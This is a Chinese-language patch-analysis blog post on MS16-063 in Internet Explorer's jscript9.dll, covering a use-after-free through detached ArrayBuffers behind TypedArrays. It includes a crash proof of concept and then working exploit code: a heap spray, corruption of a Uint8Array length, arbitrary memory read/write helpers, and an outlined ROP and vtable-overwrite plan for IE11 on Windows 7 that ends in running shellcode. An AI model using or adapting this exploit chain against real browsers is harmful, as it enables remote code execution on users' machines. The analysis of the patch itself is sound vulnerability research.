MS16-063补丁分析（JSCRIPT9.DLL）

Moto • 2016年12月13日 • 漏洞分析 • 阅读 1228

前言

几个月前微软发布了MS16-063的每月计划更新。它解决了影响Internet Explorer的漏洞，除此之外还修复了一个内存破坏漏洞 jscript9.dll中的 TypedArray和 DataView两个函数。

我们要分析的补丁，找出漏洞，并构建一个exploit。

修复前后对比

我们首先使用 BinDiff来分析5月和6月的 jscript9.dll的区别：

与上次不同，这次的改动比较多。但是如果我们仔细看看，大部分的改动都是和 DirectGetItem、 DirectSetItem方法和 TypedArray及其关联类有关。同时也能看到 DataView类里的 GetValue和 SetValue的函数的改动。

TypedArray与DataView

有关 TypedArray的更多资料请参考：mozilla，但它提供了的那个用于访问的函数是受一个 ArrayBuffer备份原始二进制数据的机制。ArrayBuffer不能访问或直接操作，只能通过 view这类高级接口来操作，它包含了一段包括自身类型，偏移，多个元素在内的内容。

使用DataView，我们可以得到灵活的读取和写入任意的字节顺序（字节序）任意数据项。

使用TypedArray，我们可以指定数组元素的数据类型为以下之一：

  • Int8Array: 有符号 8-bit 整数
  • Uint8Array: 无符号 8-bit 整数
  • Uint8ClampedArray: 无符号 8-bit 插值整数 (插值基于 0 到 255)
  • Int16Array: 有符号 16-bit 整数
  • Uint16Array: 无符号 16-bit 整数
  • Int32Array: 有符号 32-bit 整数
  • Uint32Array: 无符号 32-bit 整数
  • Float32Array: 32-bit IEEE 浮点数 (float)
  • Float64Array: 64-bit IEEE 浮点数 (double)

TypedArray和 DataView两个函数在访问与操作原始数据的功能上相似，那么是什么造成了这些功能补丁的变化？

分析

很容易可以看出更新后的版本添加了一些代码

六月与五月

更新前， DirectGetItem、 DirectSetItem每个类型数组只是检查索引是不是超出了范围，然后读入缓冲区。

GetDirectItem（5月）

伪代码大致如下：

inline Var DirectGetItem(__in uint32 index)
{
 if (index < GetLength())
 {
 TypeName* typedBuffer = (TypeName*)buffer;
 return JavascriptNumber::ToVar(
 typedBuffer[index], GetScriptContext()
 );
 }
 return GetLibrary()->GetUndefined();
}

需要注意的是这里的缓冲区根本就没有检查自身数据，因此缓冲区可以在被访问或操作前分离，从而导致UAF漏洞。

我们可以强制一下 ArrayBuffer通过使用 postMessage传值来分离缓冲区。下面的代码足以脱离由 AB引用的 ArrayBuffer：

function detach(ab) {
 postMessage("", "*", [ab]);
}

修改后的代码会检查缓冲区逃逸问题，以防止发生UAF。

GetDirectItem（6月）

有趣的是，这个漏洞明明已经在ChakraCore的首次提交（2016年1月）的代码里已经修复了。

// https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/TypedArray.h#L238

inline Var BaseTypedDirectGetItem(__in uint32 index)
{
 if (this->IsDetachedBuffer()) // 9.4.5.8 IntegerIndexedElementGet
 {
 JavascriptError::ThrowTypeError(GetScriptContext(), JSERR_DetachedTypedArray);
 }

if (index < GetLength())
 {
 Assert((index + 1)* sizeof(TypeName)+GetByteOffset() <= GetArrayBuffer()->GetByteLength());
 TypeName* typedBuffer = (TypeName*)buffer;
 return JavascriptNumber::ToVar(typedBuffer[index], GetScriptContext());
 }
 return GetLibrary()->GetUndefined();
}

本次更新之后， jscript9会去验证一遍 TypedArray和 DataView两个函数的缓冲区逃逸。

触发POC

触发漏洞的步骤很简单：

  • 创建一个 TypedArray——我们可以用任何类型的数据，但是这里使用 Int8Array
  • 通过第一步的 Int8Array制造一个 ArrayBuffer的缓冲区逃逸，用来释放缓冲区
  • 使用 Int8Array访问已经被释放的缓冲区
<html>
 <body>
 <script>
 function pwn() {
 var ab = new ArrayBuffer(1000 * 1024);
 var ia = new Int8Array(ab);
 detach(ab);
 setTimeout(main, 50, ia);

function detach(ab) {
 postMessage("", "*", [ab]);
 }

function main(ia) {
 ia[100] = 0x41414141;
 }
 }
 setTimeout(pwn, 50);
 </script>
 </body>
</html>

crash!

具体来说，这个它在写入已经被释放的内存（即ia[100]现在指向空闲内存）从而导致程序崩溃。对攻击来说，则需要创建并且先分配这个对象的元数据，这样才会有任意内存读写的效果。

利用

在这篇文章中，我们测试的环境为Windows7，Internet Explorer 11以及edge，因为目前这些版本还没有修复该漏洞。

正如上文POC所示，首先要分配一个 ArrayBuffer对象，使用 Int8Array，然后继续分配一个较大的 ArrayBuffer缓冲区（~2MB），这样内存就会在使用后被系统释放。使用这种方法的好处是不需要对缓冲区大小做太严格的限制，大致2MB就可以了。

var ab = new ArrayBuffer(2123 * 1024);
var ia = new Int8Array(ab);

一旦我们触发了内存回收机制，它就可以填充N多较小的数据到那个被释放的内存空间里，达到内容可控的效果。

var ab2 = new ArrayBuffer(0x1337);
function sprayHeap() {
 for (var i = 0; i < 100000; i++) {
 arr[i] = new Uint8Array(ab2);
 }
}

这将会触发LFH控制大小的类函数 sizeof(Uint8Array)，同时多个内存块也会被LFH分配。

我们可以通过用VMMap来查看：

现在就要定位一个我们刚刚创建过的 Uint8Array的对象， Uint8Array类有4byte长，这时候需要搜索下刚刚定义的ab2(0x1337)，找到之后就需要手动增加对应数组 arr的长度。

for (var i = 0; ia[i] != 0x37 || ia[i+1] != 0x13 || ia[i+2] != 0x00 || ia[i+3] != 0x00; i++)
{
 if (ia[i] === undefined)
 return;
}

ia[i]++;
lengthIdx = i;

try {
 for (var i = 0; arr[i].length != 0x1338; i++);
} catch (e) {
 return;
}

mv = arr[i];

我们在这个刚刚分配的特殊的 Uint8Array对象将用来作为读取存储view和写入任意内存的变量：

function ub(sb) {
 return (sb < 0) ? sb + 0x100 : sb;
}

var bufaddr = ub(ia[lengthIdx + 4]) | ub(ia[lengthIdx + 4 + 1]) << 8 | ub(ia[lengthIdx + 4 + 2]) << 16 | 
ub(ia[lengthIdx + 4 + 3]) << 24;
var vtable = ub(ia[lengthIdx - 0x1c]) | ub(ia[lengthIdx - 0x1b]) << 8 | ub(ia[lengthIdx - 0x1a]) << 16 | 
ub(ia[lengthIdx - 0x19]) << 24;

像往常一样，我们编写简单的辅助功能：

function setAddress(addr) {
 ia[lengthIdx + 4] = addr & 0xFF;
 ia[lengthIdx + 4 + 1] = (addr >> 8) & 0xFF;
 ia[lengthIdx + 4 + 2] = (addr >> 16) & 0xFF;
 ia[lengthIdx + 4 + 3] = (addr >> 24) & 0xFF;
}

function readN(addr, n) {
 if (n != 4 && n != 8)
 return 0;
 setAddress(addr);
 var ret = 0;
 for (var i = 0; i < n; i++)
 ret |= (mv[i] << (i * 8))
 return ret;
}

function writeN(addr, val, n) {
 if (n != 2 && n != 4 && n != 8)
 return;
 setAddress(addr);
 for (var i = 0; i < n; i++)
 mv[i] = (val >> (i * 8)) & 0xFF
}

好的。接下来怎么办？

根据目标环境的不同，我们也有很多不同的方法来实现上面的攻击，对于开始提到的Win7IE11环境，攻击方案如下：

  • 计算泄露vftable地址的jscript9基址.
  • 在堆缓冲区建立一个fake virtual function table.
    使用stack-pivot gadget替换子数组的指针
    mov esp, ebx; pop ebx; ret
    注意：EBX是我们提供给子数组的第一个参数
  • 读取 VirtualProtect入口，导入表.
  • 构造ROP Payload，调用函数 VirtualProtect到shellcode的缓冲区.
  • 覆盖原来 Uint8Array对象 的vftable地址为我们刚刚构造的那个.
  • 调用mv.subarray，完成。
